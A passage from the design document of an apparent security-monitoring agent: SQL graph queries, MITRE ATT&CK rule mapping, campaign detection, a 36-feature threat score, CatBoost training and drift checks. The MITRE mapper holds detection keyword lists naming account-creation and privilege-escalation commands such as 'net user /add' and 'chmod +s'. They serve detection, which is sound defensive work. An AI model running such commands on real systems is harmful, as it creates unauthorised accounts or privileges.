  AND action = 'escalate'
  AND timestamp > now() - INTERVAL 48 HOUR
GROUP BY source_ip
HAVING escalation_count <= 50 OR has_ioc = 1
-- Rationale: >50 escalations with no IOC = scanner/noisy infra, not a genuine threat.
-- IOC-matched IPs override the cap (a botnet C2 can legitimately have many escalations).
SETTINGS max_execution_time = 8
```

**Recency-weighted escalation rate (V6 fix applied in post-processing):**
```python
def compute_neighbor_escalate_rate(escalation_data: dict, total_neighbors: int) -> float:
    """
    Compute neighbor escalation rate weighted by recency.
    escalation_data: {ip: {escalation_count, max_score, has_ioc, recent_6h, recent_24h}}
    IPs with >50 escalations and no IOC are already excluded by the SQL HAVING clause.
    """
    if not total_neighbors:
        return 0.0

    # Count neighbors with ANY recent escalation (last 24h) — more signal than lifetime count
    recently_escalated = sum(
        1 for e in escalation_data.values()
        if e["recent_24h"] >= 1
    )
    return recently_escalated / total_neighbors
```

```sql
-- Query 5: Hop-2 neighbors (SKIP if len(hop1_neighbors) > 50)
SELECT toString(n2.dst_ip) as hop2_peer,
       count() as conn_count
FROM clif_logs.network_events n2
WHERE toString(n2.src_ip) IN %(neighbor_ips)s
  AND toString(n2.dst_ip) != %(source_ip)s
  AND n2.timestamp > now() - INTERVAL 24 HOUR
GROUP BY hop2_peer
HAVING conn_count >= 3
LIMIT 30
SETTINGS max_execution_time = 8
```

**Output — 8 float features (all SQL-computed):**
```python
graph_neighbor_count              # unique peers from queries 1+2 (deduplicated)
graph_neighbor_escalate_rate      # fraction of neighbors found in query 4 / total neighbors
graph_neighbor_ioc_rate           # fraction of neighbors with has_ioc=1 from query 4
graph_total_bytes_zscore          # log1p(total_bytes_24h) / 20.0 — normalized byte volume
graph_unique_dst_ports            # from query 3 — distinct dst_port count
graph_hop2_reach                  # count of hop-2 nodes from query 5 (0 if skipped)
graph_max_neighbor_score          # max adjusted_score from query 4
graph_bidirectional_ratio         # |outbound ∩ inbound| / |outbound ∪ inbound| from queries 1+2
```

**Expected latency:** Queries 1-3 run in parallel (~25ms each), then query 4 feeds from their results (~25ms), then query 5 conditionally (~25ms). Total: ~75-100ms. This is the L1 bottleneck.

---

### L2 Thread 1: MITRE Mapper

**Purpose:** Map the investigation context to ATT&CK framework tactics and techniques.

**One ClickHouse query — verified against `mitre_mapping_rules` schema:**

```sql
-- mitre_mapping_rules columns: rule_id (String), priority (UInt8),
--   trigger_features (Array(String)), trigger_threshold (Float32),
--   mitre_id (String), mitre_name (String), mitre_tactic (String),
--   confidence (Enum8 LOW/MEDIUM/HIGH), description (String)
SELECT rule_id, trigger_features, trigger_threshold,
       mitre_id, mitre_name, mitre_tactic, confidence
FROM clif_logs.mitre_mapping_rules FINAL
WHERE 1=1
ORDER BY priority ASC
SETTINGS max_execution_time = 5
```

**Mapping logic — uses investigation context, not raw features:**

The `trigger_features` in `mitre_mapping_rules` reference feature names like `event_freq_1m`, `std_dev_high`, etc. Since Hunter doesn't have the raw 20 Triage features, the mapping uses a combination of TriageResult fields and investigation results:

```python
# V6 FIX: off_hours, template_user_created, template_priv_escalation were hardcoded to 0.
# Any mitre_mapping_rules rule that ONLY uses one of these 3 trigger_features would
# silently never fire — a permanent hidden blind spot.
#
# FIXES:
#   off_hours         → derivable from triage_msg["timestamp"] (ISO-8601 available)
#   template_user_created    → derive from template_id keyword matching (Drain3 template strings
#                              contain the log text: "useradd", "adduser", "account created", etc.)
#   template_priv_escalation → derive from template_id keyword matching ("sudo", "su ",
#                              "privilege", "escalat", "runas", "administrator")
#
# All three are now computed from data available in the TriageResult message.

def _is_off_hours(timestamp_str: str) -> int:
    """Return 1 if event occurred outside 07:00-19:00 UTC."""
    try:
        dt = datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
        return 1 if dt.hour < 7 or dt.hour >= 19 else 0
    except Exception:
        return 0  # fallback: assume business hours (false negative, not false positive)

def _template_matches(template_id: str, keywords: list) -> int:
    """Return 1 if any keyword appears in the Drain3 template string."""
    t = template_id.lower()
    return 1 if any(kw in t for kw in keywords) else 0

def build_feature_context(triage_msg: dict, temporal, graph, similarity) -> dict:
    """Build a feature context dict for MITRE rule matching."""
    template_id = triage_msg.get("template_id", "")
    timestamp   = triage_msg.get("timestamp", "")

    return {
        # Map trigger_features to available data
        "event_freq_1m":         temporal.event_count,
        "template_auth":         _template_matches(template_id, ["auth", "login", "logon", "pam", "kerberos", "ldap"]),
        "unique_hosts_5m":       graph.neighbor_count,
        "template_lateral":      1 if graph.neighbor_escalate_rate > 0.3 else 0,
        "known_malicious_ip":    triage_msg.get("ioc_match", 0),
        "outbound":              1,
        # V6 FIX: Was hardcoded 0. Now derived from template_id keyword matching.
        "template_user_created":     _template_matches(template_id, [
            "useradd", "adduser", "new user", "user created",
            "account created", "groupadd", "net user /add"
        ]),
        # V6 FIX: Was hardcoded 0. Now derived from timestamp.
        "off_hours":                 _is_off_hours(timestamp),
        # V6 FIX: Was hardcoded 0. Now derived from template_id keyword matching.
        "template_priv_escalation":  _template_matches(template_id, [
            "sudo", "su ", "privilege", "escalat", "runas",
            "administrator", "root shell", "setuid", "chmod +s"
        ]),
        "template_data_exfil":   1 if graph.total_bytes_zscore > 0.7 else 0,
        "large_payload":         1 if graph.total_bytes_zscore > 0.5 else 0,
        "eif_high":              1 if triage_msg.get("eif_score", 0) > 0.7 else 0,
        "lgbm_low":              1 if triage_msg.get("lgbm_score", 0) < 0.3 else 0,
        "novel_template":        1 if triage_msg.get("template_rarity", 1) < 0.1 else 0,
        "template_port_scan":    1 if graph.unique_dst_ports > 20 else 0,
        "multi_port":            1 if graph.unique_dst_ports > 10 else 0,
        "std_dev_high":          triage_msg.get("score_std_dev", 0),
    }

# V6: Startup validation — warn about any seeded rule that can never fire
# Run once at agent startup after loading mitre_mapping_rules from ClickHouse.
def validate_mitre_rules(rules: list) -> None:
    """Log a warning for any MITRE rule whose trigger_features are all unknown."""
    KNOWN_FEATURES = {
        "event_freq_1m", "template_auth", "unique_hosts_5m", "template_lateral",
        "known_malicious_ip", "outbound", "template_user_created", "off_hours",
        "template_priv_escalation", "template_data_exfil", "large_payload",
        "eif_high", "lgbm_low", "novel_template", "template_port_scan",
        "multi_port", "std_dev_high",
    }
    for rule in rules:
        unknown = [f for f in rule.trigger_features if f not in KNOWN_FEATURES]
        if unknown:
            logger.warning(
                f"MITRE rule {rule.rule_id} ({rule.mitre_id}) has trigger_features "
                f"unknown to build_feature_context: {unknown}. This rule will NEVER fire. "
                f"Add a mapping or update the rule's trigger_features."
            )

matched_tactics = set()
matched_techniques = []

for rule in rules:
    feature_context = build_feature_context(triage_msg, temporal, graph, similarity)
    # Check if ANY trigger feature exceeds threshold
    triggered = False
    for feat_name in rule.trigger_features:
        feat_val = feature_context.get(feat_name, 0)
        if feat_val >= rule.trigger_threshold:
            triggered = True
            break
    if triggered:
        matched_tactics.add(rule.mitre_tactic)
        matched_techniques.append(rule.mitre_id)

# Merge with Triage's own MITRE tags (single strings, may be empty)
triage_tactic = triage_msg.get("mitre_tactic", "")
triage_technique = triage_msg.get("mitre_technique", "")
if triage_tactic:
    matched_tactics.add(triage_tactic)
if triage_technique:
    matched_techniques.append(triage_technique)

# Merge with graph neighbor MITRE tags from L1
for neighbor in graph_result.escalated_neighbors:
    for tactic in neighbor.tactics:
        if tactic:
            matched_tactics.add(tactic)

# Kill chain coverage = fraction of 14 ATT&CK tactics covered
TOTAL_TACTICS = 14
kill_chain_coverage = len(matched_tactics) / TOTAL_TACTICS
```

**Output — 2 features:**
```python
kill_chain_coverage        # float: matched tactics / 14
matched_technique_count    # int: total matched technique IDs
```

---

### L2 Thread 2: Campaign Detector

**Purpose:** Determine if this event is part of a coordinated attack involving multiple source IPs targeting shared destinations.

**One ClickHouse query — verified against `triage_scores` (String source_ip) and `network_events` (IPv4 src_ip/dst_ip):**

```sql
-- Join triage_scores (source_ip String) with network_events (src_ip IPv4)
-- using toString() cast for type compatibility
SELECT ts2.source_ip,
       count(DISTINCT toString(ne.dst_ip)) as shared_dst_count,
       groupArray(DISTINCT ts2.mitre_tactic) as tactics,
       max(ts2.adjusted_score) as max_score
FROM clif_logs.triage_scores ts2
JOIN clif_logs.network_events ne ON toString(ne.src_ip) = ts2.source_ip
WHERE ts2.action = 'escalate'
  AND ts2.source_ip != %(source_ip)s
  AND ts2.timestamp > now() - INTERVAL 48 HOUR
  AND ne.dst_ip IN (
      SELECT dst_ip FROM clif_logs.network_events
      WHERE toString(src_ip) = %(source_ip)s
      AND timestamp > now() - INTERVAL 24 HOUR
  )
GROUP BY ts2.source_ip
HAVING shared_dst_count >= 2
LIMIT 20
SETTINGS max_execution_time = 10
```

**Confidence formula:**

```python
def compute_campaign_confidence(matching_entities, triage_msg):
    if not matching_entities:
        return 0.0, 0

    # Tactic overlap: how many of trigger's tactics appear in campaign
    trigger_tactics = set()
    tac = triage_msg.get("mitre_tactic", "")
    if tac:
        trigger_tactics.add(tac)

    campaign_tactics = set()
    for e in matching_entities:
        for t in e["tactics"]:
            if t:
                campaign_tactics.add(t)

    tactic_overlap = (
        len(trigger_tactics & campaign_tactics) / max(len(trigger_tactics), 1)
        if trigger_tactics else 0.0
    )

    # Entity weight: log-scaled to avoid large botnets dominating
    entity_factor = min(1.0, math.log(len(matching_entities) + 1) / math.log(20))

    # Shared destination weight
    avg_shared = sum(e["shared_dst_count"] for e in matching_entities) / len(matching_entities)
    dst_weight = min(1.0, avg_shared / 5.0)

    # Weighted combination
    confidence = (0.40 * tactic_overlap) + (0.35 * entity_factor) + (0.25 * dst_weight)
    return round(confidence, 4), len(matching_entities)
```

**Output — 2 features:**
```python
campaign_confidence        # float 0.0-1.0
campaign_entity_count      # int: number of coordinating source IPs
```

---

### RAG Narrative Builder

**Purpose:** Build a human-readable investigation narrative. Determine severity and finding_type.

**This is NOT AI-generated text.** It is structured string assembly from investigation results. This is intentional — it is fast, deterministic, and auditable.

```python
def build_narrative(triage_msg, temporal, graph, similarity, mitre, campaign):
    parts = []

    source_ip = triage_msg.get("source_ip", "unknown")
    hostname = triage_msg.get("hostname", "unknown")
    adjusted_score = triage_msg.get("adjusted_score", 0)

    # Header
    parts.append(
        f"Investigation of {source_ip} "
        f"(host: {hostname}) — "
        f"Triage score: {adjusted_score:.2f}"
    )

    # Temporal context
    if temporal.event_count > 0:
        parts.append(
            f"Temporal context: {temporal.event_count} related events found within ±10 minutes. "
            f"{temporal.high_sev_ratio*100:.0f}% were high/critical severity."
        )

    # Graph context
    if graph.neighbor_count > 0:
        parts.append(
            f"Network graph: {graph.neighbor_count} unique peers observed in last 24h. "
            f"{graph.neighbor_escalate_rate*100:.0f}% of neighbors were previously escalated. "
            f"{graph.neighbor_ioc_rate*100:.0f}% matched known IOC indicators."
        )

    # Similarity context (V5: context-aware framing based on anomaly type)
    if similarity.evasion_flag:
        parts.append(
            f"STEALTH ALERT: Event is textually similar to normal operations "
            f"(cosine distance {similarity.context_min_distance:.2f} to known benign events). "
            f"However, statistical features are anomalous (EIF: {triage_msg.get('eif_score', 0):.2f}). "
            f"High probability of defense evasion — attacker mimicking normal operations "
            f"(MITRE T1036: Masquerading)."
        )
    elif similarity.novelty_flag:
        parts.append(
            f"NOVEL PATTERN: No matching attack patterns found in vector database "
            f"(nearest attack distance: {similarity.attack_distance:.2f}). "
            f"EIF isolation forest confirms statistical anomaly ({triage_msg.get('eif_score', 0):.2f}). "
            f"Treat as zero-day until proven otherwise."
        )
    elif similarity.incident_match:
        parts.append(
            f"Historical match: Similar pattern found in historical incidents "
            f"(similarity score: {1 - similarity.min_distance:.2f})."
        )

    # MITRE context
    if mitre.matched_tactics:
        parts.append(
            f"ATT&CK coverage: {len(mitre.matched_tactics)} tactics identified — "
            f"{', '.join(sorted(mitre.matched_tactics))}. "
            f"Kill chain coverage: {mitre.kill_chain_coverage*100:.0f}%."
        )

    # Campaign context
    if campaign.entity_count > 0:
        parts.append(
            f"CAMPAIGN DETECTED: {campaign.entity_count} other source IPs showing coordinated "
            f"behavior toward shared destinations. Campaign confidence: {campaign.confidence:.2f}."
        )

    return " ".join(parts)
```

**Severity determination:**

```python
def determine_severity(confidence, campaign, graph, temporal):
    # severity values must match Enum8: 'info'=0, 'low'=1, 'medium'=2, 'high'=3, 'critical'=4
    if confidence >= 0.90 or campaign.entity_count > 0:
        return "critical"
    elif confidence >= 0.75 or graph.neighbor_escalate_rate > 0.5:
        return "high"
    elif confidence >= 0.55 or temporal.high_sev_ratio > 0.4:
        return "medium"
    elif confidence >= 0.35:
        return "low"
    else:
        return "info"
```

**Finding type — priority chain (free String, not Enum) — V5 updated with novel/evasion types:**
```python
def determine_finding_type(campaign, graph, mitre, similarity, triage_msg):
    if campaign.entity_count > 0:
        return "campaign"
    if triage_msg.get("ioc_match"):
        return "ioc_correlation"
    # V5 NEW: Evasion detection (textually normal but statistically anomalous)
    if similarity.evasion_flag:
        return "evasion_technique"   # MITRE T1036 (Masquerading)
    # V5 NEW: Novel anomaly (no match in attack_embeddings + high EIF)
    if similarity.novelty_flag:
        return "novel_anomaly"       # Treat as zero-day until proven otherwise
    if graph.neighbor_escalate_rate > 0.3 and mitre.kill_chain_coverage > 0.2:
        return "multi_vector"
    if mitre.kill_chain_coverage > 0.3:
        return "kill_chain"
    if triage_msg.get("disagreement_flag"):
        return "anomaly"
    return "anomaly"
```

---

## 5. The Graph Problem — SQL vs GNN Decision

### Why GNN is NOT in Phase 4

A GNN (Graph Neural Network) would produce better accuracy for graph-based threats. The decision to use SQL graph features instead is **deliberate and time-limited** based on:

| Constraint | Impact on GNN |
|---|---|
| 4GB RAM, CPU only | GNN forward pass on CPU for large graphs = unacceptable latency |
| No PyTorch in stack | Adding PyTorch + PyG = +2GB image size, new failure surface |
| Hunter doesn't exist yet | Can't optimize what isn't built |
| <100 labeled samples at launch | GNN would underfit severely |
| No persistent graph state | Must rebuild graph per event from SQL |

### What SQL Graph Features Actually Capture Well

- **Obvious IOC propagation** — if your neighbors are known bad, you're probably bad
- **Escalation clustering** — high-score neighbors = high-risk context
- **Lateral movement breadcrumbs** — bidirectional ratio + hop-2 reach catches east-west movement
- **Data exfiltration signatures** — bytes z-score catches unusual transfer volumes

### What SQL Graph Features Miss

- **Structural patterns** — an IP positioned like APT C2 infrastructure but with clean neighbors
- **Temporal graph evolution** — the graph changes over time; SQL sees a snapshot
- **Learned node embeddings** — GNN can represent "behaves like" not just "connected to"

### GNN Migration Path (Phase 5)

Once Verifier is live and providing clean labels (500+ verified samples):

```
Phase 5 additions:
1. Add PyTorch + torch-geometric to requirements (separate container if needed)
2. Pre-compute node embeddings nightly (batch job, not per-event)
3. Store embeddings in LanceDB graph_embeddings table
4. At inference time: fetch pre-computed embedding for source_ip
5. Replace graph_builder's 8 SQL features with 32-dim embedding
6. Retrain CatBoost with new feature set (36-dim → 60-dim)
```

---

## 6. Scoring Engine — Two-Phase Strategy

### Feature Vector — 36 Dimensions (V5: expanded from V3's 33, corrected from V2's 42)

V2 plan included 20 raw Triage features in the vector. **This was wrong** — Triage does not publish raw features to Kafka. The V3-corrected 33-dim vector used only fields from the TriageResult message and investigation-computed features. **V5 added 3 similarity features** (`attack_distance`, `novelty_flag`, `evasion_flag`) for the multi-signal decision matrix.

```python
FEATURE_ORDER = [
    # ── From TriageResult message (13 features) ──────────────────────
    'combined_score',           # 0  — weighted fusion score
    'lgbm_score',               # 1  — LightGBM ONNX score
    'eif_score',                # 2  — Extended Isolation Forest score
    'arf_score',                # 3  — River ARF score
    'score_std_dev',            # 4  — std(lgbm, eif, arf)
    'agreement',                # 5  — 1 - score_std_dev
    'adjusted_score',           # 6  — post-boost × asset_multiplier
    'asset_multiplier',         # 7  — from asset_criticality table
    'template_rarity',          # 8  — 0.0-1.0 (lower = rarer)
    'ioc_match',                # 9  — 0 or 1
    'ioc_confidence_norm',      # 10 — ioc_confidence / 100.0 (normalize 0-100 → 0-1)
    'features_stale',           # 11 — 0 or 1
    'disagreement_flag',        # 12 — 0 or 1

    # ── Graph features from SQL (8 features) ─────────────────────────
    'graph_neighbor_count',           # 13
    'graph_neighbor_escalate_rate',   # 14
    'graph_neighbor_ioc_rate',        # 15
    'graph_total_bytes_zscore',       # 16
    'graph_unique_dst_ports',         # 17
    'graph_hop2_reach',               # 18
    'graph_max_neighbor_score',       # 19
    'graph_bidirectional_ratio',      # 20

    # ── Temporal features (4 features) ───────────────────────────────
    'temporal_event_count',           # 21
    'temporal_high_sev_ratio',        # 22
    'temporal_unique_tactics',        # 23
    'temporal_recency_score',         # 24

    # ── Similarity features (7 features — V5 expanded from 4) ────────
    'similarity_min_distance',        # 25 — distance to nearest ATTACK (attack_embeddings)
    'similarity_mean_distance',       # 26 — avg distance in attack_embeddings
    'similarity_incident_match',      # 27 — 1 if historical incident matched
    'similarity_incident_severity',   # 28 — matched incident severity (0-1)
    'similarity_attack_distance',     # 29 — explicit attack-space distance (V5 NEW)
    'similarity_novelty_flag',        # 30 — 1 if novel anomaly (no attack match + high EIF) (V5 NEW)
    'similarity_evasion_flag',        # 31 — 1 if stealth attack (textually normal, stat anomalous) (V5 NEW)

    # ── MITRE features (2 features) ──────────────────────────────────
    'kill_chain_coverage',            # 32
    'matched_technique_count',        # 33

    # ── Campaign features (2 features) ───────────────────────────────
    'campaign_confidence',            # 34
    'campaign_entity_count',          # 35
]

assert len(FEATURE_ORDER) == 36
```

**Why 36 and not 42:** Every feature in this vector is derivable from data that actually exists. The V2 plan's first 20 features (raw Triage features like `hour_of_day`, `src_bytes`, etc.) are never serialized to Kafka — they live only inside the Triage agent's memory during scoring. Including them was a phantom dependency.

**V5 expansion (33 → 36):** 3 new similarity features added: `similarity_attack_distance`, `similarity_novelty_flag`, `similarity_evasion_flag`. These encode the multi-signal decision matrix output that cross-references LanceDB results with Triage's EIF score and template rarity. When LanceDB is unavailable, all 3 default to neutral (0.5, 0, 0).

**Future enhancement:** If Triage is later modified to include raw features in the `triage-scores` message (e.g., by adding a `features` dict to `TriageResult`), the vector can be extended back to 56 dimensions (36 + 20 raw). The CatBoost retraining loop handles feature count changes automatically.

---

### Phase 1: Heuristic Scorer (Day 0 — No Trained Model)

```python
HEURISTIC_WEIGHTS = {
    'triage':     0.30,   # adjusted_score from Triage (already trusted)
    'graph_esc':  0.20,   # graph_neighbor_escalate_rate
    'graph_ioc':  0.15,   # graph_neighbor_ioc_rate
    'temporal':   0.10,   # temporal_high_sev_ratio
    'similarity': 0.05,   # 1.0 - similarity_min_distance (V5: reduced from 0.10)
    'novelty':    0.03,   # similarity_novelty_flag (V5 NEW)
    'evasion':    0.02,   # similarity_evasion_flag (V5 NEW)
    'ioc':        0.05,   # ioc_match from Triage (1 or 0)
    'mitre':      0.05,   # kill_chain_coverage
    'campaign':   0.05,   # 1.0 if campaign else 0.0
}
# Sum = 1.00
# V5 note: similarity weight reduced from 0.10 to 0.05+0.03+0.02 and split into
#   attack_distance (0.05), novelty_flag (0.03), evasion_flag (0.02).
#   This prevents LanceDB log_embeddings from dominating the verdict.
#   The novelty and evasion flags RAISE severity, they don't lower it.

def heuristic_score(features: dict) -> float:
    score = (
        HEURISTIC_WEIGHTS['triage']     * clamp(features['adjusted_score'], 0, 1) +
        HEURISTIC_WEIGHTS['graph_esc']  * features['graph_neighbor_escalate_rate'] +
        HEURISTIC_WEIGHTS['graph_ioc']  * features['graph_neighbor_ioc_rate'] +
        HEURISTIC_WEIGHTS['temporal']   * features['temporal_high_sev_ratio'] +
        HEURISTIC_WEIGHTS['similarity'] * (1.0 - features['similarity_attack_distance']) +  # V5: attack distance, not log distance
        HEURISTIC_WEIGHTS['novelty']    * features['similarity_novelty_flag'] +              # V5: novel anomaly RAISES score
        HEURISTIC_WEIGHTS['evasion']    * features['similarity_evasion_flag'] +              # V5: evasion RAISES score
        HEURISTIC_WEIGHTS['ioc']        * features['ioc_match'] +
        HEURISTIC_WEIGHTS['mitre']      * features['kill_chain_coverage'] +
        HEURISTIC_WEIGHTS['campaign']   * (1.0 if features['campaign_entity_count'] > 0 else 0.0)
    )
    return round(clamp(score, 0.0, 1.0), 4)

def clamp(val, lo, hi):
    return max(lo, min(hi, val))
```

### Phase 2: CatBoost Scorer (After ~100 Labeled Samples)

**CatBoost configuration:**
```python
from catboost import CatBoostClassifier, Pool

CatBoostClassifier(
    iterations=500,
    learning_rate=0.05,
    depth=6,
    task_type="CPU",
    loss_function="Logloss",
    eval_metric="AUC",
    random_seed=42,
    od_type="Iter",       # early stopping
    od_wait=50,           # stop if no improvement in 50 rounds
    verbose=False
)
```

**Inference:**
```python
def catboost_score(feature_vector: np.ndarray, model: CatBoostClassifier) -> float:
    assert feature_vector.shape == (36,), f"Expected 36 features, got {feature_vector.shape}"
    proba = model.predict_proba(feature_vector.reshape(1, -1))
    return float(proba[0][1])  # p_malicious
```

**Hot reload (every 5 minutes):**
```python
MODEL_PATH = "/app/models/hunter_catboost.cbm"

def try_upgrade(model_path: str, current_model, current_mtime: float):
    try:
        mtime = os.path.getmtime(model_path)
        if mtime > current_mtime:
            new_model = CatBoostClassifier()
            new_model.load_model(model_path)
            # Validate feature count matches
            if new_model.feature_count_ == 36:
                return new_model, mtime
            else:
                logger.warning(f"Model has {new_model.feature_count_} features, expected 36")
    except Exception as e:
        logger.warning(f"Model upgrade failed: {e}")
    return current_model, current_mtime
```

**Mode switching logic:**
```python
def get_sample_count(ch_client) -> int:
    result = ch_client.execute(
        "SELECT count() FROM clif_logs.hunter_training_data WHERE label IS NOT NULL"
    )
    return result[0][0]

# At startup and after each training run:
if get_sample_count() >= 100 and os.path.exists(MODEL_PATH):
    mode = "catboost"
else:
    mode = "heuristic"
```

---

## 7. Self-Supervised Training — Fixing Label Quality

### The Label Quality Problem

Training CatBoost on uncertain pseudo-labels creates a ceiling on accuracy. The solution: strict label hierarchy with confidence weighting.

### Improved Label Hierarchy

```
Priority 1 (confidence=1.0): Analyst feedback
    feedback_labels WHERE label IN ('true_positive', 'false_positive')
    ← feedback_labels.label is Enum8('true_positive'=1, 'false_positive'=2, 'unknown'=3)

Priority 2 (confidence=1.0): Verifier results (Phase 5)
    verifier_results WHERE status IN ('verified', 'false_positive')
    ← verifier_results.status is Enum8('verified'=2, 'false_positive'=3)

Priority 3 (confidence=0.85): Strong pseudo-positive
    triage_scores WHERE ioc_match=1 AND agreement>0.95 AND adjusted_score>0.80

Priority 4 (confidence=0.80): Strong pseudo-negative — Hunter's OWN low-confidence investigations
    hunter_investigations JOIN hunter_training_data WHERE
        severity IN ('info', 'low')
        AND confidence < 0.30
        AND finding_type NOT IN ('campaign', 'ioc_correlation', 'evasion_technique', 'novel_anomaly')
    ← V6 FIX: The original Priority 4 (triage_scores WHERE action='discard') always returned ZERO
      ROWS because discarded events are never investigated by Hunter and never enter
      hunter_training_data. hunter_investigations (written by consumer from hunter-results)
      IS the correct source for pseudo-negatives — Hunter-investigated events where
      Hunter itself found nothing significant.

Priority 5 (confidence=0.65): Weak pseudo-positive
    triage_scores WHERE ioc_match=1 AND agreement>0.9
    → Downweighted heavily during training

DISCARD entirely:
    triage_scores WHERE agreement < 0.9
    → Low agreement means the 3 Triage models disagreed — noisy data
```

### Training Schedule

```python
class SelfSupervisedTrainer:

    RETRAIN_INTERVAL_HOURS = 6
    MIN_SAMPLES = 100
    MAX_SAMPLES = 10000

    def build_training_set(self):
        """Pull labeled samples in priority order."""

        # Analyst overrides (always included, all of them)
        # feedback_labels columns: event_id (UUID), label (Enum8), confidence (Enum8)
        analyst = self.ch.execute("""
            SELECT htd.features, fl.label, 1.0 as weight
            FROM clif_logs.hunter_training_data htd
            JOIN clif_logs.feedback_labels fl ON toString(fl.event_id) = toString(htd.event_id)
            WHERE fl.label IN ('true_positive', 'false_positive')
        """)

        # Pseudo-positives (strong only)
        # triage_scores columns: ioc_match (UInt8), agreement (Float32), adjusted_score (Float32)
        pseudo_pos = self.ch.execute("""
            SELECT htd.features, 1 as label, 0.85 as weight
            FROM clif_logs.hunter_training_data htd
            JOIN clif_logs.triage_scores ts ON toString(ts.event_id) = toString(htd.event_id)
            WHERE ts.ioc_match = 1 AND ts.agreement > 0.95 AND ts.adjusted_score > 0.80
            LIMIT 3000
        """)

        # Pseudo-negatives — Hunter's own low-confidence investigations
        # V6 FIX: The original query JOINed hunter_training_data with triage_scores WHERE
        # action='discard'. This ALWAYS returned zero rows because Hunter only writes to
        # hunter_training_data for escalated events (adjusted_score > 0.65). Discarded events
        # are never investigated and never enter that table.
        #
        # CORRECT SOURCE: hunter_investigations (written by consumer from hunter-results Kafka topic)
        # These are cases where Hunter itself investigated and found nothing significant:
        #   - severity info/low (Hunter found no strong evidence)
        #   - confidence < 0.30 (Hunter was not confident this was an attack)
        #   - finding_type not a specific attack class (just generic 'anomaly')
        #
        # hunter_investigations columns: alert_id (UUID), severity (Enum8), confidence (Float32),
        #   finding_type (LowCardinality(String))
        # hunter_training_data columns: alert_id (UUID), features Array(Float32)
        pseudo_neg = self.ch.execute("""
            SELECT htd.features, 0 as label, 0.80 as weight
            FROM clif_logs.hunter_training_data htd
            JOIN clif_logs.hunter_investigations hi
                ON toString(hi.alert_id) = toString(htd.alert_id)
            WHERE hi.severity IN ('info', 'low')
              AND hi.confidence < 0.30
              AND hi.finding_type NOT IN (
                  'campaign', 'ioc_correlation', 'evasion_technique',
                  'novel_anomaly', 'multi_vector', 'kill_chain'
              )
            LIMIT 3000
        """)

        # Validation guard: warn if pseudo-negatives are suspiciously empty
        if len(pseudo_neg) == 0:
            logger.warning(
                "TRAINER: Zero pseudo-negatives found. Model will train on positives only. "
                "This is expected at startup. Add analyst feedback_labels or wait for "
                "Hunter to accumulate low-confidence investigations."
            )

        return analyst + pseudo_pos + pseudo_neg

    def train(self, samples):
        X = np.array([s[0] for s in samples], dtype=np.float32)  # features Array(Float32)
        y = np.array([1 if s[1] in ('true_positive', 1) else 0 for s in samples], dtype=np.int32)
        weights = np.array([s[2] for s in samples], dtype=np.float32)

        n_pos = y.sum()
        n_neg = len(y) - n_pos
        scale_pos_weight = n_neg / max(n_pos, 1)

        pool = Pool(X, y, weight=weights)
        model = CatBoostClassifier(
            iterations=500, learning_rate=0.05, depth=6,
            task_type="CPU", scale_pos_weight=scale_pos_weight,
            verbose=False
        )
        model.fit(pool)

        # Atomic save
        tmp_path = MODEL_PATH + ".tmp"
        model.save_model(tmp_path)
        os.replace(tmp_path, MODEL_PATH)
        logger.info(f"Model saved: {n_pos} positives, {n_neg} negatives, {len(samples)} total")
```

---

## 8. Drift Detection

Two background checks run every 300 seconds (after 10-minute warmup):

### Score Distribution Drift

```python
def check_score_drift(ch_client):
    # V6 FIX: Original code compared last-1h vs last-24h — both windows shift together
    # when the model drifts gradually, making the KL divergence stay low. The detector
    # was blind to the most common drift pattern (slow degradation over hours/days).
    #
    # FIX A: Use 7-day-to-1-day window as baseline (predates today's potential drift)
    # FIX B: Add Triage-anchored divergence check using trigger_score vs confidence
    #         hunter_investigations has BOTH: trigger_score (Triage's adjusted_score)
    #         and confidence (Hunter's verdict). These are independent scoring systems.
    #         If |confidence - trigger_score| grows, Hunter is drifting from Triage's
    #         ground truth — detectable without any external reference.
    #
    # hunter_investigations columns: confidence (Float32), trigger_score (Float32),
    #   status (Enum8), started_at (DateTime64(3))

    # Baseline: 7-day to 1-day ago (stable historical window, predates recent changes)
    baseline_scores = ch_client.execute("""
        SELECT confidence FROM clif_logs.hunter_investigations
        WHERE started_at BETWEEN now() - INTERVAL 7 DAY AND now() - INTERVAL 1 DAY
        AND status = 'completed'
    """)

    # Current: last 1h
    current_scores = ch_client.execute("""
        SELECT confidence FROM clif_logs.hunter_investigations
        WHERE started_at > now() - INTERVAL 1 HOUR
        AND status = 'completed'
    """)

    if len(current_scores) < 10:
        return  # not enough data
    if len(baseline_scores) < 50:
        logger.info("DRIFT: Insufficient baseline data (< 50 samples in 7-day window). Skipping KL check.")
    else:
        baseline_dist = bucketize([r[0] for r in baseline_scores], bins=11, laplace_smoothing=1)
        current_dist = bucketize([r[0] for r in current_scores], bins=11, laplace_smoothing=1)

        kl_div = compute_kl_divergence(current_dist, baseline_dist)  # threshold: 0.15
        psi = compute_psi(current_dist, baseline_dist)               # threshold: 0.20

        ch_client.execute(
            "INSERT INTO clif_logs.hunter_model_health (metric, value, timestamp) VALUES",
            [{'metric': 'kl_divergence', 'value': kl_div, 'timestamp': datetime.utcnow()}]
        )

        if kl_div > 0.15:
            logger.warning(f"DRIFT ALERT: KL divergence {kl_div:.3f} exceeds threshold 0.15")
        if psi > 0.20:
            logger.warning(f"DRIFT ALERT: PSI {psi:.3f} exceeds threshold 0.20")

    # Triage-anchored divergence check (V6 NEW)
    # Measures whether Hunter's confidence is drifting AWAY from Triage's trigger_score.
    # This is independent of Hunter's past output — Triage scores are a stable external anchor.
    divergence_check = ch_client.execute("""
        SELECT
            avg(abs(confidence - trigger_score))  AS mean_divergence,
            stddevPop(confidence - trigger_score) AS std_divergence,
            avg(confidence - trigger_score)       AS mean_bias
        FROM clif_logs.hunter_investigations
        WHERE started_at > now() - INTERVAL 1 HOUR
          AND status = 'completed'
    """)

    if divergence_check and divergence_check[0][0] is not None:
        mean_div, std_div, mean_bias = divergence_check[0]
        ch_client.execute(
            "INSERT INTO clif_logs.hunter_model_health (metric, value, timestamp) VALUES",
            [{'metric': 'triage_divergence', 'value': mean_div, 'timestamp': datetime.utcnow()},
             {'metric': 'hunter_bias',       'value': mean_bias,'timestamp': datetime.utcnow()}]
        )
        # Hunter confidence significantly above Triage score = over-alerting
        # Hunter confidence significantly below Triage score = under-alerting
        if mean_div > 0.25:
            logger.warning(
                f"DRIFT ALERT: Hunter confidence diverging from Triage scores "
                f"(mean |diff|={mean_div:.3f}). "
